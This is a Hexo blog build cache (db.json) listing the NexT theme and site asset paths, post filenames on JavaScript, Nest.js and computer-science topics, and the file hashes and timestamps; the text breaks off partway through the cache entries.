{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"source/CNAME","path":"CNAME","modified":1,"renderable":0},{"_id":"source/img/alipay.jpeg","path":"img/alipay.jpeg","modified":1,"renderable":0},{"_id":"source/img/favicon.ico","path":"img/favicon.ico","modified":1,"renderable":0},{"_id":"source/img/logo-black.jpg","path":"img/logo-black.jpg","modified":1,"renderable":0},{"_id":"source/img/loading.gif","path":"img/loading.gif","modified":1,"renderable":0},{"_id":"source/img/logo-gray.jpg","path":"img/logo-gray.jpg","modified":1,"renderable":0},{"_id":"source/img/default-skin.png","path":"img/default-skin.png","modified":1,"renderable":0},{"_id":"source/img/image.jpg","path":"img/image.jpg","modified":1,"renderable":0},{"_id":"source/img/preloader.gif","path":"img/preloader.gif","modified":1,"renderable":0},{"_id":"source/img/logo.png","path":"img/logo.png","modified":1,"renderable":0},{"_id":"source/img/prototypeImg.png","path":"img/prototypeImg.png","modified":1,"renderable":0},{"_id":"source/img/scrollbar_arrow.png","path":"img/scrollbar_arrow.png","modified":1,"renderable":0},{"_id":"source/img/logo-red.jpg","path":"img/logo-red.jpg","modified":1,"renderable":0},{"_id":"source/img/wechat.png","path":"img/wechat.png","modified":1,"renderable":0},{"_id":"themes/next/source/css/main.styl","path":"css/main.styl","modified":1,"renderable":1},{"_id":"themes/next/source/images/algolia_logo.svg","path":"images/algolia_logo.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/avatar.gif","path":"images/avatar.gif","modified":1,"renderable":1},{"_id":"themes/next/source/images/apple-touch-icon-next.png","path":"images/apple-touch-icon-next.png","modified":1,"renderable":1},{"_id":"themes/next/source/images/cc-by-nc-nd.svg","path":"images/cc-by-nc-nd.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/cc-by-nc-sa.svg","path":"images/cc-by-nc-sa.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/cc-by-nc.svg","path":"images/cc-by-nc.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/cc-by-nd.svg","path":"images/cc-by-nd.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/cc-by-sa.svg","path":"images/cc-by-sa.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/cc-by.svg","path":"images/cc-by.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/cc-zero.svg","path":"images/cc-zero.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/favicon-16x16-next.png","path":"images/favicon-16x16-next.png","modified":1,"renderable":1},{"_id":"themes/next/source/images/favicon-32x32-next.png","path":"images/favicon-32x32-next.png","modified":1,"renderable":1},{"_id":"themes/next/source/images/loading.gif","path":"images/loading.gif","modified":1,"renderable":1},{"_id":"themes/next/source/images/logo.svg","path":"images/logo.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/placeholder.gif","path":"images/placeholder.gif","modified":1,"renderable":1},{"_id":"themes/next/source/images/quote-l.svg","path":"images/quote-l.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/quote-r.svg","path":"images/quote-r.svg","modified":1,"renderable":1},{"_id":"themes/next/source/images/searchicon.png","path":"images/searchicon.png","modified":1,"renderable":1},{"_id":"themes/next/source/lib/canvas-nest/canvas-nest.min.js","path":"lib/canvas-nest/canvas-nest.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/canvas-ribbon/canvas-ribbon.js","path":"lib/canvas-ribbon/canvas-ribbon.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/algolia-instant-search/instantsearch.min.css","path":"lib/algolia-instant-search/instantsearch.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/jquery_lazyload/README.md","path":"lib/jquery_lazyload/README.md","modified":1,"renderable":1},{"_id":"themes/next/source/lib/jquery_lazyload/CONTRIBUTING.md","path":"lib/jquery_lazyload/CONTRIBUTING.md","modified":1,"renderable":1},{"_id":"themes/next/source/lib/jquery_lazyload/bower.json","path":"lib/jquery_lazyload/bower.json","modified":1,"renderable":1},{"_id":"themes/next/source/lib/jquery_lazyload/jquery.lazyload.js","path":"lib/jquery_lazyload/jquery.lazyload.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/jquery_lazyload/jquery.scrollstop.js","path":"lib/jquery_lazyload/jquery.scrollstop.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/needsharebutton/needsharebutton.js","path":"lib/needsharebutton/needsharebutton.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/needsharebutton/font-embedded.css","path":"lib/needsharebutton/font-embedded.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/needsharebutton/needsharebutton.css","path":"lib/needsharebutton/needsharebutton.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-barber-shop.min.css","path":"lib/pace/pace-theme-barber-shop.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-bounce.min.css","path":"lib/pace/pace-theme-bounce.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-big-counter.min.css","path":"lib/pace/pace-theme-big-counter.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-center-circle.min.css","path":"lib/pace/pace-theme-center-circle.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-center-atom.min.css","path":"lib/pace/pace-theme-center-atom.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-center-simple.min.css","path":"lib/pace/pace-theme-center-simple.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-center-radar.min.css","path":"lib/pace/pace-theme-center-radar.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-corner-indicator.min.css","path":"lib/pace/pace-theme-corner-indicator.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-fill-left.min.css","path":"lib/pace/pace-theme-fill-left.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-flash.min.css","path":"lib/pace/pace-theme-flash.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-loading-bar.min.css","path":"lib/pace/pace-theme-loading-bar.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-mac-osx.min.css","path":"lib/pace/pace-theme-mac-osx.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace-theme-minimal.min.css","path":"lib/pace/pace-theme-minimal.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/pace/pace.min.js","path":"lib/pace/pace.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fastclick/LICENSE","path":"lib/fastclick/LICENSE","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fastclick/README.md","path":"lib/fastclick/README.md","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fastclick/bower.json","path":"lib/fastclick/bower.json","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/bower.json","path":"lib/font-awesome/bower.json","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/affix.js","path":"js/src/affix.js","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/algolia-search.js","path":"js/src/algolia-search.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/HELP-US-OUT.txt","path":"lib/font-awesome/HELP-US-OUT.txt","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/bootstrap.js","path":"js/src/bootstrap.js","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/hook-duoshuo.js","path":"js/src/hook-duoshuo.js","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/exturl.js","path":"js/src/exturl.js","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/js.cookie.js","path":"js/src/js.cookie.js","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/post-details.js","path":"js/src/post-details.js","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/scroll-cookie.js","path":"js/src/scroll-cookie.js","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/scrollspy.js","path":"js/src/scrollspy.js","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/utils.js","path":"js/src/utils.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/three/canvas_lines.min.js","path":"lib/three/canvas_lines.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/three/canvas_sphere.min.js","path":"lib/three/canvas_sphere.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/three/three-waves.min.js","path":"lib/three/three-waves.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/velocity/bower.json","path":"lib/velocity/bower.json","modified":1,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.min.js","path":"lib/velocity/velocity.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.ui.js","path":"lib/velocity/velocity.ui.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.ui.min.js","path":"lib/velocity/velocity.ui.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/jquery/index.js","path":"lib/jquery/index.js","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/motion.js","path":"js/src/motion.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/Han/dist/han.min.js","path":"lib/Han/dist/han.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/blank.gif","path":"lib/fancybox/source/blank.gif","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/fancybox_loading.gif","path":"lib/fancybox/source/fancybox_loading.gif","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/fancybox_overlay.png","path":"lib/fancybox/source/fancybox_overlay.png","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/fancybox_loading@2x.gif","path":"lib/fancybox/source/fancybox_loading@2x.gif","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/fancybox_sprite.png","path":"lib/fancybox/source/fancybox_sprite.png","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/fancybox_sprite@2x.png","path":"lib/fancybox/source/fancybox_sprite@2x.png","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.css","path":"lib/fancybox/source/jquery.fancybox.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.pack.js","path":"lib/fancybox/source/jquery.fancybox.pack.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.js","path":"lib/fancybox/source/jquery.fancybox.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fastclick/lib/fastclick.min.js","path":"lib/fastclick/lib/fastclick.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css","path":"lib/font-awesome/css/font-awesome.css","modified":1,"renderable":1},{"_id":"themes/next/source/js/src/schemes/pisces.js","path":"js/src/schemes/pisces.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.pack.js","path":"lib/ua-parser-js/dist/ua-parser.pack.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.min.js","path":"lib/ua-parser-js/dist/ua-parser.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/Han/dist/han.css","path":"lib/Han/dist/han.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/Han/dist/han.min.css","path":"lib/Han/dist/han.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/Han/dist/han.js","path":"lib/Han/dist/han.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fastclick/lib/fastclick.js","path":"lib/fastclick/lib/fastclick.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css.map","path":"lib/font-awesome/css/font-awesome.css.map","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.min.css","path":"lib/font-awesome/css/font-awesome.min.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/Han/dist/font/han-space.otf","path":"lib/Han/dist/font/han-space.otf","modified":1,"renderable":1},{"_id":"themes/next/source/lib/Han/dist/font/han-space.woff","path":"lib/Han/dist/font/han-space.woff","modified":1,"renderable":1},{"_id":"themes/next/source/lib/Han/dist/font/han.woff","path":"lib/Han/dist/font/han.woff","modified":1,"renderable":1},{"_id":"themes/next/source/lib/Han/dist/font/han.otf","path":"lib/Han/dist/font/han.otf","modified":1,"renderable":1},{"_id":"themes/next/source/lib/Han/dist/font/han.woff2","path":"lib/Han/dist/font/han.woff2","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/fancybox_buttons.png","path":"lib/fancybox/source/helpers/fancybox_buttons.png","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-buttons.css","path":"lib/fancybox/source/helpers/jquery.fancybox-buttons.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-buttons.js","path":"lib/fancybox/source/helpers/jquery.fancybox-buttons.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-media.js","path":"lib/fancybox/source/helpers/jquery.fancybox-media.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-thumbs.css","path":"lib/fancybox/source/helpers/jquery.fancybox-thumbs.css","modified":1,"renderable":1},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-thumbs.js","path":"lib/fancybox/source/helpers/jquery.fancybox-thumbs.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff2","path":"lib/font-awesome/fonts/fontawesome-webfont.woff2","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff","path":"lib/font-awesome/fonts/fontawesome-webfont.woff","modified":1,"renderable":1},{"_id":"themes/next/source/lib/velocity/velocity.js","path":"lib/velocity/velocity.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/FontAwesome.otf","path":"lib/font-awesome/fonts/FontAwesome.otf","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.eot","path":"lib/font-awesome/fonts/fontawesome-webfont.eot","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.ttf","path":"lib/font-awesome/fonts/fontawesome-webfont.ttf","modified":1,"renderable":1},{"_id":"themes/next/source/lib/algolia-instant-search/instantsearch.min.js","path":"lib/algolia-instant-search/instantsearch.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/three/three.min.js","path":"lib/three/three.min.js","modified":1,"renderable":1},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.svg","path":"lib/font-awesome/fonts/fontawesome-webfont.svg","modified":1,"renderable":1}],"Cache":[{"_id":"source/.DS_Store","hash":"059afd34624f340aa1bcc9bda7ed363878396feb","modified":1634103194001},{"_id":"source/CNAME","hash":"7ba9f834082d77e4963aa10f1608eca1f11bad2f","modified":1629769791284},{"_id":"themes/next/.bowerrc","hash":"3228a58ed0ece9f85e1e3136352094080b8dece1","modified":1631334350425},{"_id":"themes/next/.editorconfig","hash":"792fd2bd8174ece1a75d5fd24ab16594886f3a7f","modified":1631334350425},{"_id":"themes/next/.gitattributes","hash":"44bd4729c74ccb88110804f41746fec07bf487d4","modified":1631334350425},{"_id":"themes/next/.gitignore","hash":"0b5c2ffd41f66eb1849d6426ba8cf9649eeed329","modified":1631334350425},{"_id":"themes/next/.hound.yml","hash":"b76daa84c9ca3ad292c78412603370a367cc2bc3","modified":1631334350425},{"_id":"themes/next/.jshintrc","hash":"9928f81bd822f6a8d67fdbc909b517178533bca9","modified":1631334350426},{"_id":"themes/next/.stylintrc","hash":"b28e24704a5d8de08346c45286574c8e76cc109f","modified":1631334350426},{"_id":"themes/next/.travis.yml","hash":"d60d4a5375fea23d53b2156b764a99b2e56fa660","modified":1631334350426},{"_id":"themes/next/.javascript_ignore","hash":"8a224b381155f10e6eb132a4d815c5b52962a9d1","modified":1631334350426},{"_id":"themes/next/LICENSE","hash":"f293bcfcdc06c0b77ba13570bb8af55eb5c059fd","modified":1631334350426},{"_id":"themes/next/README.cn.md","hash":"263b74f1ac7c0f6f9424b8cced4b0b320ae61efc","modified":1631334350426},{"_id":"themes/next/README.md","hash":"287c7e6b7a6ddf75d815dda0df8bd228e3f285c5","modified":1631334350426},{"_id":"themes/next/package.json","hash":"036d3a1346203d2f1a3958024df7f74e7ac07bfe","modified":1631334350433},{"_id":"themes/next/bower.json","hash":"0674f11d3d514e087a176da0e1d85c2286aa5fba","modified":1631334350426},{"_id":"themes/next/gulpfile.coffee","hash":"031bffc483e417b20e90eceb6cf358e7596d2e69","modified":1631334350426},{"_id":"themes/next/_config.yml","hash":"0796fd00d2ac0dba3fa01e4a4091eeeb526b96dc","modified":1633763900598},{"_id":"source/about/index.md","hash":"dc92f1c2cb3d3b0e89874aa958002c4e03faabf6","modified":1631338760575},{"_id":"source/_drafts/magic-coding.md","hash":"69811373bb818373ed73b79303d9ca292ba798af","modified":1629769791284},{"_id":"source/_posts/.DS_Store","hash":"28b82e9a09edbbb06a6a76ede2faab51da808da1","modified":1634103195852},{"_id":"source/_posts/2017-ele-Interecommunions.md","hash":"3086685ad0f8274ed4b85a7e4abd47090af7647f","modified":1631336768719},{"_id":"source/_posts/2017-summery.md","hash":"68b7925a31461f3b5e0e0c3383aae471006a154e","modified":1631336361796},{"_id":"source/_posts/2018-tencent-practice.md","hash":"27684fdbe8d3dc719b53e3cee0dfe7893f621d3a","modified":1631336367897},{"_id":"source/_posts/basic-computer-sience-chapter2.md","hash":"3baa10bbd689ce1659194fce1e0eb5d79c7bea5b","modified":1631339083844},{"_id":"source/_posts/basic-computer-sience-chapter3.md","hash":"d312e107dd3bb05f87a84501b89d845367269dee","modified":1631339066930},{"_id":"source/_posts/2021-middle-summary.md","hash":"a010d3e81c734ef0705e894b5aaa43c70507e434","modified":1631360753089},{"_id":"source/_posts/basic-computer-sience-chapter4.md","hash":"d9f28068ef1433a482146d166fc6b29807b1d14a","modified":1631339043795},{"_id":"source/_posts/basic-cookies.md","hash":"3a9d5855691f271847874a15fcf590aef279408e","modified":1634140113804},{"_id":"source/_posts/basic-computer-sience-chapter5.md","hash":"12f55566af1e153a3b86a752d9de1e6d13b474a7","modified":1631339053360},{"_id":"source/_posts/best-practice-of-decorator.md","hash":"5e2a26d7321ce0b923ec78110c3583ebd0bf4477","modified":1634140135510},{"_id":"source/_posts/font-end-optimize.md","hash":"e98e2e153be4a65c07b5492f3ca1a18b325de920","modified":1634139685643},{"_id":"source/_posts/git-rebase-merge-commit.md","hash":"3a663726731e992abde5db83333dac6260d370af","modified":1634140344451},{"_id":"source/_posts/computer-network-chapter2.md","hash":"114adcc622d980d0e39d2fe591d04195a4d386bb","modified":1631338999652},{"_id":"source/_posts/nest-js-tutorial-1.md","hash":"76488c45e7fda58aec44d57e4a5a15471fddf2af","modified":1634140159692},{"_id":"source/_posts/meet-ncuhomer.md","hash":"a3c16e22bb56689097fd5d26aa1becaa35c4fb48","modified":1631336480051},{"_id":"source/_posts/nest-js-tutorial-2.md","hash":"05473a01848f7fe944b3a8592619344b86f09d43","modified":1634140168071},{"_id":"source/_posts/nest-js-tutorial-3.md","hash":"90134ff0a10c1bc7e392ac02b91b2cfeba4f9775","modified":1634140176133},{"_id":"source/_posts/read-javascript-again-chapter4.md","hash":"4ecf700e6d791aa5c1ab42d24d6dbc78fb1a0505","modified":1634140331634},{"_id":"source/_posts/nest-js-tutorial-4.md","hash":"02346d09d9acf268017b262f03542bd490fc0df0","modified":1634140188655},{"_id":"source/_posts/read-javascript-again-chapter1-3.md","hash":"b6a77d3e74a7ab9652e4aabcd301ee0bcde60d85","modified":1634140216488},{"_id":"source/_posts/read-javascript-again-chapter5.md","hash":"a19e69392aa55f1b14d45e6c7907f8b5fd51b4fa","modified":1634140212540},{"_id":"source/_posts/read-javascript-again-chapter7.md","hash":"553d9e8dc3cb3383c2c9c8ffc2678f9018a63074","modified":1634140315083},{"_id":"source/_posts/read-javascript-again-chapter6.md","hash":"de03cc9f4b2242b598318a462751b2834780e66b","modified":1634140323887},{"_id":"source/_posts/summer-2017-feeling.md","hash":"44e1cbe0ef393ae7b9890976eec040cbcb47ffcd","modified":1631336454893},{"_id":"source/_posts/the-skills-of-develop.md","hash":"baeeb4b9da9e351fa569fe2f23c22e3cd184b39d","modified":1634140302907},{"_id":"source/_posts/touch-http.md","hash":"8060a0637d260d95dc2f6e8e3eab425f7467157d","modified":1634140292880},{"_id":"source/_posts/the-mythical-man-month.md","hash":"f31aac02984220801fecfc351a84dad03d66ab9a","modified":1631338951215},{"_id":"source/_posts/use-dhcp.md","hash":"54386671fb95181f35a29e5be21e16815283a300","modified":1634140285920},{"_id":"source/_posts/what-is-sse.md","hash":"8df6c3d544e4eb6971453791735a07a6460d3a3f","modified":1634140073471},{"_id":"source/_posts/what-is-xss-csrf.md","hash":"a66ec005407a92acea88f3f3d5a2aa2eed17877d","modified":1634140271119},{"_id":"source/_posts/you-dont-konwn-javascript-scope.md","hash":"857faf72c08485add223d62bbe32529914b5387b","modified":1634140244595},{"_id":"source/_posts/you-dont-konwn-javascript-this.md","hash":"c6c49ccb0f5f8ecb860c561ed1ac3b25621054e1","modified":1634140237547},{"_id":"source/_posts/《大型网站技术架》读书笔记.md","hash":"3c916209d1f97919d6c2917df935f11381811f23","modified":1634139626151},{"_id":"source/_posts/you-dont-konwn-javascript-type.md","hash":"3b7d3e911b90b3b8d89d8195a961844f35c4a8a5","modified":1634140229714},{"_id":"source/img/.DS_Store","hash":"df2fbeb1400acda0909a32c1cf6bf492f1121e07","modified":1629769791303},{"_id":"source/img/alipay.jpeg","hash":"fcaad01681cf09ec4fb96277c88a446f5b4e8f21","modified":1629769791303},{"_id":"source/img/favicon.ico","hash":"5701242b6eb05d2b71615b0a351a39c58d1d1783","modified":1633763859575},{"_id":"source/img/logo-black.jpg","hash":"549521c171c59821548e78964b2f2b76f1954aa4","modified":1633763827159},{"_id":"source/img/loading.gif","hash":"e10a01566e2fbf5009ad538f504cc9f3e4647a8c","modified":1634138862462},{"_id":"source/img/logo-gray.jpg","hash":"5701242b6eb05d2b71615b0a351a39c58d1d1783","modified":1633763827124},{"_id":"source/img/default-skin.png","hash":"ed95a8e40a2c3478c5915376acb8e5f33677f24d","modified":1629769791303},{"_id":"source/img/image.jpg","hash":"7ebf6661c2fbd35ec6eef3a44ab5023a3d5d1d8d","modified":1629769791304},{"_id":"source/img/preloader.gif","hash":"6342367c93c82da1b9c620e97c84a389cc43d96d","modified":1629769791304},{"_id":"source/img/logo.png","hash":"0a9073a07d903d89b4687b4fbe7a6e359d788d3c","modified":1633763827189},{"_id":"source/img/prototypeImg.png","hash":"1ccd755cbb315aa227fd614e12dd1df87fda8792","modified":1629769791304},{"_id":"source/img/scrollbar_arrow.png","hash":"d64a33c4ddfbdb89deeb6f4e3d36eb84dc4777c0","modified":1629769791304},{"_id":"source/img/logo-red.jpg","hash":"c8ef3c81f82cc5379ca33b073321858b179c7b11","modified":1633763827193},{"_id":"source/img/wechat.png","hash":"2fc1021ead13e0cb4cbe397e5040f3b535269bf5","modified":1629769791304},{"_id":"themes/next/.git/HEAD","hash":"acbaef275e46a7f14c1ef456fff2c8bbe8c84724","modified":1631334350420},{"_id":"themes/next/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1631334344700},{"_id":"themes/next/.git/config","hash":"bf7d1df65cf34d0f25a7184a58c37a09f72e4be7","modified":1631334350424},{"_id":"themes/next/.git/packed-refs","hash":"3bb2e8e3fad44742d3e3bfadfb0b4d791fe9fe9e","modified":1631334350419},{"_id":"source/tags/index.md","hash":"60614cbc78dfc3574f4cd29a18a5dc1f38d895e0","modified":1631361780851},{"_id":"themes/next/.git/index","hash":"a29dec20bc548bcf6d2b0b541f67b64b9840995d","modified":1631337967563},{"_id":"themes/next/.github/CONTRIBUTING.md","hash":"3b5eafd32abb718e56ccf8d1cee0607ad8ce611d","modified":1631334350425},{"_id":"themes/next/.github/ISSUE_TEMPLATE.md","hash":"50d48c47162817a3810a9d9ad51104e83947419a","modified":1631334350425},{"_id":"themes/next/.github/PULL_REQUEST_TEMPLATE.md","hash":"902f627155a65099e0a37842ff396a58d0dc306f","modified":1631334350425},{"_id":"themes/next/.github/browserstack_logo.png","hash":"a6c43887f64a7f48a2814e3714eaa1215e542037","modified":1631334350425},{"_id":"themes/next/scripts/merge-configs.js","hash":"81e86717ecfb775986b945d17f0a4ba27532ef07","modified":1631334350434},{"_id":"themes/next/languages/de.yml","hash":"057e7df11ddeb1c8c15a5d7c5ff29430d725ec6b","modified":1631334350427},{"_id":"themes/next/languages/default.yml","hash":"44ef3f26917f467459326c2c8be2f73e4d947f35","modified":1631334350427},{"_id":"themes/next/languages/en.yml","hash":"7e680d9bb8f3a3a9d1ba1c9d312b3d257183dded","modified":1631334350427},{"_id":"themes/next/languages/fr-FR.yml","hash":"7e4eb7011b8feee641cfb11c6e73180b0ded1c0f","modified":1631334350427},{"_id":"themes/next/languages/id.yml","hash":"b5de1ea66dd9ef54cac9a1440eaa4e3f5fc011f5","modified":1631334350427},{"_id":"themes/next/languages/it.yml","hash":"aa595f2bda029f73ef7bfa104b4c55c3f4e9fb4c","modified":1631334350427},{"_id":"themes/next/languages/ja.yml","hash":"3c76e16fd19b262864475faa6854b718bc08c4d8","modified":1631334350427},{"_id":"themes/next/languages/ko.yml","hash":"ea5b46056e73ebcee121d5551627af35cbffc900","modified":1631334350427},{"_id":"themes/next/languages/nl-NL.yml","hash":"edca4f3598857dbc3cbf19ed412213329b6edd47","modified":1631334350427},{"_id":"themes/next/languages/pt-BR.yml","hash":"b1694ae766ed90277bcc4daca4b1cfa19cdcb72b","modified":1631334350427},{"_id":"themes/next/languages/pt.yml","hash":"44b61f2d085b827b507909a0b8f8ce31c6ef5d04","modified":1631334350427},{"_id":"themes/next/languages/ru.yml","hash":"98ec6f0b7183282e11cffc7ff586ceb82400dd75","modified":1631334350427},{"_id":"themes/next/languages/vi.yml","hash":"fd08d3c8d2c62965a98ac420fdaf95e54c25d97c","modified":1631334350427},{"_id":"themes/next/languages/zh-Hans.yml","hash":"16ef56d0dea94638de7d200984c90ae56f26b4fe","modified":1631334350427},{"_id":"themes/next/languages/zh-hk.yml","hash":"9396f41ae76e4fef99b257c93c7354e661f6e0fa","modified":1631334350428},{"_id":"themes/next/languages/zh-tw.yml","hash":"50b71abb3ecc0686f9739e179e2f829cd074ecd9","modified":1631334350428},{"_id":"themes/next/layout/_layout.swig","hash":"da0929166674ea637e0ad454f85ad0d7bac4aff2","modified":1631334350428},{"_id":"themes/next/layout/archive.swig","hash":"f0a8225feafd971419837cdb4bcfec98a4a59b2f","modified":1631334350433},{"_id":"themes/next/layout/category.swig","hash":"4472255f4a3e3dd6d79201523a9526dcabdfbf18","modified":1631334350433},{"_id":"themes/next/layout/page.swig","hash":"969caaee05bdea725e99016eb63d810893a73e99","modified":1631334350433},{"_id":"themes/next/layout/post.swig","hash":"b3589a8e46288a10d20e41c7a5985d2493725aec","modified":1631334350433},{"_id":"themes/next/layout/schedule.swig","hash":"d86f8de4e118f8c4d778b285c140474084a271db","modified":1631334350433},{"_id":"themes/next/layout/tag.swig","hash":"7e0a7d7d832883eddb1297483ad22c184e4368de","modified":1631334350433},{"_id":"themes/next/layout/index.swig","hash":"783611349c941848a0e26ee2f1dc44dd14879bd1","modified":1631334350433},{"_id":"themes/next/test/.jshintrc","hash":"19f93d13d1689fe033c82eb2d5f3ce30b6543cc0","modified":1631334350462},{"_id":"themes/next/test/helpers.js","hash":"a1f5de25154c3724ffc24a91ddc576cdbd60864f","modified":1631334350462},{"_id":"themes/next/test/intern.js","hash":"11fa8a4f5c3b4119a179ae0a2584c8187f907a73","modified":1631334350462},{"_id":"themes/next/scripts/merge.js","hash":"9130dabe6a674c54b535f322b17d75fe6081472f","modified":1631334350434},{"_id":"themes/next/source/fonts/.gitkeep","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1631334350442},{"_id":"source/_posts/basic-computer-sience-chapter2/ieee754image.png","hash":"a2bedb9531ae71ecb62babb3353024ca1a235965","modified":1629769791288},{"_id":"source/_posts/basic-computer-sience-chapter2/choiceTwoWay.jpg","hash":"890a866cb4f71a3e83784e67e0347ef478752295","modified":1629769791288},{"_id":"source/_posts/basic-computer-sience-chapter2/IEEE754_chart.jpg","hash":"c218b43c4490b92801e5ca739f7cb02e66c6f4ce","modified":1629769791287},{"_id":"source/_posts/basic-computer-sience-chapter3/eflagRegister.png","hash":"981c67690563b74cbe301294c4b6af97863378c2","modified":1629769791288},{"_id":"source/_posts/basic-computer-sience-chapter3/flagRegister.gif","hash":"426be67622ecca19a09dde83d93ac12859eef9d4","modified":1629769791288},{"_id":"source/_posts/basic-computer-sience-chapter3/findWay.png","hash":"a65a72ce8b48c0a74e224d917031c13d6bdcee9c","modified":1629769791288},{"_id":"source/_posts/basic-computer-sience-chapter3/purposeRegisters.jpg","hash":"66b1d88353bc734eeacce7d5379cab4e68cd1421","modified":1629769791289},{"_id":"source/_posts/basic-computer-sience-chapter3/stackValue.png","hash":"ce26d0a2f82700ac40f7e98bdd1d02fcd2f7fe50","modified":1629769791289},{"_id":"source/_posts/basic-computer-sience-chapter3/sliceRegister.jpg","hash":"c7167c22b20aeb062b4070f05646a19e31a45ab1","modified":1629769791289},{"_id":"source/_posts/basic-computer-sience-chapter4/elfImage.jpg","hash":"e595d126a2d62645c9b138ace14811cf6d5cc46e","modified":1629